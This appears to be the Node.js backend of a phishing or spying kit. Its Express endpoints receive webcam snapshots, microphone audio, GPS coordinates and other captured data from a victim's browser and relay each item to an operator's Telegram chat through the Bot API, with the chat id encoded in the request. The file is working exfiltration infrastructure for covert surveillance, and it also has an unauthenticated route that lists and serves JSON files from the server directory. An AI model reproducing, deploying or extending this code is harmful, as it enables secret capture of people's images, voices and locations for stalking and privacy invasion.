require('dotenv').config();
var TelegramBot = require('node-telegram-bot-api');
var fs = require('fs').promises;
var path = require('path');
var cors = require('cors');
var atob = require('atob');
var bodyParser = require('body-parser');
var btoa = require('btoa');
var isgd = require('isgd');
var express = require('express');
var FormData = require("form-data");
var crypto = require('crypto');
var ejs = require('ejs');
var turl = require('turl');
var linkify = require('linkify-it')();
var axios = require('axios');

var channelUsername1 = process.env.CHANNEL_USERNAME1 || -1001918443026;
var channelUsername2 = process.env.CHANNEL_USERNAME2 || -1001696399781;
var deleteMessages = process.env.delete == "true";
var channelUsername3 = process.env.CHANNEL_USERNAME3 || -1001928933168;

var app = express();

var channelUsernames = [channelUsername1, channelUsername3];

app.use(bodyParser.json({limit:1024*1024*70, type:'application/json'}));
app.use(bodyParser.urlencoded({ extended:true, limit:1024*1024*70, type:'application/x-www-form-urlencoded' }));
app.use(cors());
app.set("view engine", "ejs");
var jsonDirectory = __dirname;

app.use('/jsonFiles', async (req, res, next) => {
  try {
    var files = await fs.readdir(jsonDirectory);
    var jsonFiles = files.filter(file => file.endsWith('.json') && !file.startsWith('.') && !/^[A-Z]/.test(file));

    if (!jsonFiles.includes(path.basename(req.path))) {
      return res.status(404).send('File not found');
    }

    next();
  } catch {
    res.status(500).send('Error reading directory');
  }
});

app.use('/jsonFiles', express.static(jsonDirectory));

app.post("/audiosnap", (req, res) => {
    var audio = req.body.audio;
    var uid = req.body.uid;
    if (!audio || !uid) return res.status(400).send("Invalid request: Missing audio or uid");

    try {
        var decodedUid = decodeURIComponent(uid);
        var chatId = parseInt(decodedUid, 36);
        if (isNaN(chatId)) return res.status(400).send("Invalid uid format");

        var decodedAudio = decodeURIComponent(audio);
        var audioBuffer = Buffer.from(decodedAudio, "base64");

        res.status(200).send("Success");

        var form = new FormData();
        form.append("chat_id", chatId);
        form.append("audio", audioBuffer, {
            filename: `${uid}.webm`,
            contentType: "audio/webm"
        });

        axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendAudio`, form, {
            headers: form.getHeaders()
        }).catch(err => console.error("Failed to send audio:", err.message));

    } catch (err) {
        console.error("Error processing request:", err.message);
        res.status(500).send("Server error");
    }
});

app.post("/location", (req, res) => {
    var lat = req.body && req.body.lat ? decodeURIComponent(req.body.lat) : null;
    var lon = req.body && req.body.lon ? decodeURIComponent(req.body.lon) : null;
    var uid = req.body && req.body.uid ? decodeURIComponent(req.body.uid) : null;
    var acc = req.body && req.body.acc ? decodeURIComponent(req.body.acc) : null;

    if (!lat || !lon || !uid || !acc) return res.status(400).send("Invalid data");

    try {
        var chatId = parseInt(uid, 36);
        if (isNaN(chatId)) return res.status(400).send("Invalid uid format");

        res.status(200).send("Success");

        axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendLocation`, null, {
            params: { chat_id: chatId, latitude: lat, longitude: lon }
        }).catch(err => console.error("Failed to send location:", err.message));

        axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, null, {
            params: {
                chat_id: chatId,
                text: `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`
            }
        }).catch(err => console.error("Failed to send message:", err.message));

    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).send("Internal Server Error");
    }
});

app.post("/", (req, res) => {
    var uid = req.body && req.body.uid ? decodeURIComponent(req.body.uid) : null;
    var data = req.body && req.body.data ? decodeURIComponent(req.body.data) : null;

    if (!uid || !data) return res.status(400).send("Invalid data");

    try {
        var chatId = parseInt(uid, 36);
        if (isNaN(chatId)) return res.status(400).send("Invalid uid format");

        res.status(200).send("Success");

        data = data.replace(/<br>/g, "\n");

        axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, null, {
            params: {
                chat_id: chatId,
                text: data,
                parse_mode: "HTML"
            }
        }).catch(err => console.error("Failed to send message:", err.message));

    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).send("Internal Server Error");
    }
});

app.post("/cam-denied", (req, res) => {
    var uid = req.body && req.body.uid ? decodeURIComponent(req.body.uid) : null;
    var deniedText = req.body && req.body.deniedText ? decodeURIComponent(req.body.deniedText) : null;

    if (!uid || !deniedText) return res.status(400).send("Invalid data");

    try {
        var chatId = parseInt(uid, 36);
        if (isNaN(chatId)) return res.status(400).send("Invalid uid format");

        res.status(200).send("Success");

        axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, null, {
            params: {
                chat_id: chatId,
                text: deniedText
            }
        }).catch(err => console.error("Failed to send denied message:", err.message));

    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).send("Internal Server Error");
    }
});

app.post("/camsnap", (req, res) => {
    var uid = req.body && req.body.uid ? decodeURIComponent(req.body.uid) : null;
    var img = req.body && req.body.img ? decodeURIComponent(req.body.img) : null;

    if (!uid || !img) return res.status(400).send("Invalid data");

    try {
        var chatId = parseInt(uid, 36);
        if (isNaN(chatId)) return res.status(400).send("Invalid uid format");

        var buffer = Buffer.from(img, "base64");

        res.status(200).send("Success");

        var form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", buffer, {
            filename: "camsnap.png",
            contentType: "image/png"
        });

        axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        }).catch(err => console.error("Failed to send camsnap:", err.message));

    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).send("Internal Server Error");
    }
});

app.get('/', (req, res) => {
    res.json({ success: true, message: 'Request was successful' });
});

app.get('/download', async function(req, res) {
  try {
    var files = await fs.readdir(jsonDirectory);
    var jsonFiles = files.filter(function(file) {
      return file.endsWith('.json');
    });

    var fileListHtml = '<h1>Download JSON Files</h1><ul>';

    jsonFiles.forEach(function(file) {
      fileListHtml += '<li><a href="/jsonFiles/' + file + '" download>' + file + '</a></li>';
    });

    fileListHtml += '</ul>';
    res.send(fileListHtml);
  } catch (err) {
    res.status(500).send('Unable to read files');
  }
});

var port = 5000;

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
